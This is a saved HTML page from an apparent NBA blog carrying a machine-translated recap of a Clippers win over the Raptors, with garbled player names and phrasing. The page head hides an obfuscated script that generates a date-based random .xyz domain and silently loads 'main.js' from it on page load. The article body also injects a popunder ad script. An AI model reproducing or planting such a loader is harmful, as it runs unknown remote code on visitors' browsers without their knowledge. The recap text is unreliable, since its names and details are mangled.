<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="NBA," />










<meta name="description" content="The Raptors, who are short of major players, went to Los Angeles. They surprised the Lakers in the first game, beat them with the efforts of the whole team, and ended their seven winning streak. And t">
<meta property="og:type" content="article">
<meta property="og:title" content="Leonard 12 points 9 mistakes substitute 56 points clipper beat Raptors! The background of the miracle of the dangerous Dragon">
<meta property="og:url" content="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/index.html">
<meta property="og:site_name" content="NBA">
<meta property="og:description" content="The Raptors, who are short of major players, went to Los Angeles. They surprised the Lakers in the first game, beat them with the efforts of the whole team, and ended their seven winning streak. And t">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/38f7f94c8dd44db3ae9c9d8d691f65b2.jpg">
<meta property="og:image" content="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/c94d837541f44382bd44706b536052eb.jpg">
<meta property="og:image" content="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/c11a050bc50a45709fda7ca83c103528.jpg">
<meta property="og:image" content="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/e3819ff3dab8435dbd2f2d9aa643e6c2.jpg">
<meta property="article:published_time" content="2019-12-14T16:00:00.000Z">
<meta property="article:modified_time" content="2021-03-08T06:13:19.000Z">
<meta property="article:author" content="Thomas">
<meta property="article:tag" content="NBA">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/38f7f94c8dd44db3ae9c9d8d691f65b2.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>




  <link rel="canonical" href="http://www.mishequn.xyz/2019/12/15/Leonard 12 points 9 mistakes substitute 56 points clipper beat Raptors! The background of the miracle of the dangerous Dragon/"/>




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>Leonard 12 points 9 mistakes substitute 56 points clipper beat Raptors! The background of the miracle of the dangerous Dragon | NBA</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">NBA</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">NBA</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <script type="text/javascript">
    var uid = '279818';
    var wid = '614367';
    var pop_tag = document.createElement('script');pop_tag.src='//cdn.popcash.net/show.js';document.body.appendChild(pop_tag);
    pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//cdn2.popcash.net/show.js';document.body.appendChild(pop_tag)};
  </script>
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NBA">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Leonard 12 points 9 mistakes substitute 56 points clipper beat Raptors! The background of the miracle of the dangerous Dragon</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-15T00:00:00+08:00">
                2019-12-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="_fa7cdd4c68507744" data-zone="14bf1db5ee254acea83eef1485d47a31" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>

    <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="5b52957f5ea5444d8bd7eabc8d63bb09" style="display: none"></div>
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>The Raptors, who are short of major players, went to Los Angeles. They surprised the Lakers in the first game, beat them with the efforts of the whole team, and ended their seven winning streak. And then, there are more serious challenges waiting for the Raptors, back-to-back against the clippers, which is undoubtedly a great test of the physical fitness of the Raptors. Can they continue to create surprises and take both the male and female players out of Los Angeles?<br>Interestingly, the Raptors will meet Danny green against the Lakers, while the Clippers will meet another old player, Cowie Leonard. Van fleet joked after the team beat the Lakers. “We know all his offensive routines, so we are always watching him and can’t give him a chance to be empty. **We’ve sanctioned green tonight, and tomorrow we’re going to try the sanctioning department<br>The Clippers’ record in the new season is not so good. Although the 6-3 record seems to be average, Leonard took two of the three lost games off. Against the Raptors, Leonard was inevitably asked about last season’s experience and said to him: “people there, that journey, you know. This country, this city is so wonderful, there is so much to say. “<br>But what’s the result of the game?<br><img src="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/38f7f94c8dd44db3ae9c9d8d691f65b2.jpg" alt="Leonard 12 points 9 mistakes substitute 56 points clipper beat Raptors! The background of the miracle of the dangerous Dragon"><br>Pau Gasol and cicham<br>After the start of the game, sICAM took the lead in trying to shoot but failed to hit, while Beverly made his first attack for the Clippers. Mark Gasol responded, and the Raptors scored the first point of the game. However, there was an accident in the game. Anunoby was hit in the eye and left the field. The Clippers also took the opportunity to hit the three-point ball by Patterson. Pausing to return to the game, Patterson scored another three-point goal and the Clippers led the Raptors 9-2.<br>The attack of the two sides failed in many rounds, Norman Powell and sICAM scored one goal each, and the Raptors fell 6-9 behind the Clippers. There was a problem on the offensive side. The Clippers could only call for a pause to adjust. In the game, mark Gasol hit a three-point goal, and the Raptors tied the score. The scoring shortage was broken by one of Powell’s two penalties. Terence Davis hit the layup and the Raptors gradually took the lead.<br>Unable to score, Dewey finally came out on the offensive end, but the Raptors always had someone to respond. Chris Boucher hit a three-point goal, the Raptors led to 7 points, and Dewey got another attack. Boucher scored another three-point goal against Harrell. At the end of the first quarter, the Raptors were 23-15 points ahead of the Clippers by 8 points.<br><img src="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/c94d837541f44382bd44706b536052eb.jpg" alt="Leonard 12 points 9 mistakes substitute 56 points clipper beat Raptors! The background of the miracle of the dangerous Dragon"><br>louis williams<br>Leonard’s technical foul hit the Clippers first in the second quarter, they also found the rhythm of attack. The strength of the substitute lineup of the Raptors is obviously inferior to that of the Clippers. They started the game with an attack climax of 8-0 and directly tied the score to 23. Jefferson got two penalties and one hit. The Raptors scored for the first time in the second quarter. Harrell got the attack. The Clippers had finished the anti super.<br>The attack tide of the Raptors followed, and in less than a minute, they played a wave of 7-0, and the Raptors regained the lead. However, the loopholes of the Raptors were still found. Harrell and hackers found opportunities under the basket one after another, and the inner line of the Raptors was in crisis. Leonard fouls Pau Gasol. Two penalties and two strikes. The Clippers are even. Cicham’s attack was successful, and the Raptors finally stopped bleeding.<br>The game went into a glued state, with van fleet scoring two points and the Raptors 44-40 ahead of the Clippers. Shamet in a three-point goal, zubates four points in a row, the Clippers won the lead. The Raptors were only 1 point behind the Clippers 10 seconds before the end of the last game, but after Beverly’s attack, he caused Powell’s anti grab foul in the defense, two penalties and two strikes.<br>At the end of the first half, the Clippers led the Raptors 51-46.<br><img src="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/c11a050bc50a45709fda7ca83c103528.jpg" alt="Leonard 12 points 9 mistakes substitute 56 points clipper beat Raptors! The background of the miracle of the dangerous Dragon"><br>Kawhi Leonard<br>In the beginning of the third quarter, both sides made many mistakes on the court, and failed to score in nearly one and a half minutes. Norman Powell’s passing was out of bounds. The Clippers seized the opportunity to fight back. Shamet’s three-point goal helped the Clippers score in the third quarter. Jefferson’s attack was successful, and the Raptors scored in the third quarter. Paterson scored another three-point goal, and the clippers were nine points ahead.<br>Mark Gasol also scored a three-point goal, Powell scored two more points, and the Raptors steadied the slide. The defense of the Raptors was very hard. The Clippers grabbed the offensive rebounds many times in an attack round, but the Raptors kept the basket, not only preventing the attack of the clippers, but also playing a successful counterattack. Powell made two penalties for Beverly’s foul, and the Raptors were only three points behind.<br>When the game came to a standoff, Patterson hit a three-point goal, and sICAM was able to level the score. The score alternates to lead, on the field also appears the accident situation, shamet and fan fulit collides after the injury leaves the field. In the last minute, Matt Thomas grabbed the last minute of the third quarter and the Raptors scored a 6-0 run. At the end of the third quarter, the Raptors led the Clippers 78-73.<br><img src="http://www.mishequn.xyz/2019/12/15/Leonard%2012%20points%209%20mistakes%20substitute%2056%20points%20clipper%20beat%20Raptors!%20The%20background%20of%20the%20miracle%20of%20the%20dangerous%20Dragon/e3819ff3dab8435dbd2f2d9aa643e6c2.jpg" alt="Leonard 12 points 9 mistakes substitute 56 points clipper beat Raptors! The background of the miracle of the dangerous Dragon"><br>Patrick Beverley<br>Shortly after the end of the game, the Clippers made a 7-1 score, which immediately exceeded. The Raptors are tired after three competitions, and the strength gap of the rotation team makes the Raptors fall into a passive situation. The clippers were three points ahead of the Raptors. Chris Bucher hit a three-point goal to level the score.<br>It’s hard for the Raptors to score in the attack. Jamie green is good at attacking. The Clippers are six points ahead of the Raptors. The Raptors called a pause, and the team’s attack still hasn’t changed in the game. The Raptors are in trouble. Bucher grabbed the rebounds, the second attack layup was successful, and the Raptors finally reduced the difference to 4 points. The Clippers held on for the last time and the Raptors were unable to change the game. In the end, the Clippers won 98-88.<br>Lack of two main players, the game began to hurt anunoby, the Raptors in such a bad situation, still with the Clippers in the game played extremely hard. The Raptors were very successful in defending kewy Leonard, a consistent superstar who made nine mistakes in the game. Although the Raptors failed to create a miracle in the end, the fierce First World War showed the tenacity of the defending champion.<br>The Raptors nearly created a miracle in Los Angeles, just one step away from the back-to-back defeat of the Los Angeles twins, but the Raptors almost let the Clippers become the background of their magic performance.<br>(Wen / Yan Wuqiang)</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/NBA/" rel="tag"># NBA</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/12/15/Leonard%2023%20+%206%20George%2013%20points%20clipper%20wins%20Raptor%2020%20points%20Raptor%20two%20will%20be%20depressed%20and%20the%20competition%20will%20be%20difficult/" rel="next" title="Leonard 23 + 6 George 13 points clipper wins Raptor 20 points Raptor two will be depressed and the competition will be difficult">
                <i class="fa fa-chevron-left"></i> Leonard 23 + 6 George 13 points clipper wins Raptor 20 points Raptor two will be depressed and the competition will be difficult
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/12/15/Leonard%2011%20+%209%20George%2025%20points%20clipper%20one%20big%20advantage,%20finish%20the%20explosion,%20one%20pioneer%20becomes%20a%20marvel,%20a%20strong%20clipper/" rel="prev" title="Leonard 11 + 9 George 25 points clipper one big advantage, finish the explosion, one pioneer becomes a marvel, a strong clipper">
                Leonard 11 + 9 George 25 points clipper one big advantage, finish the explosion, one pioneer becomes a marvel, a strong clipper <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%20%7C%7C%20archive">
              
                  <span class="site-state-item-count">122</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Thomas</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
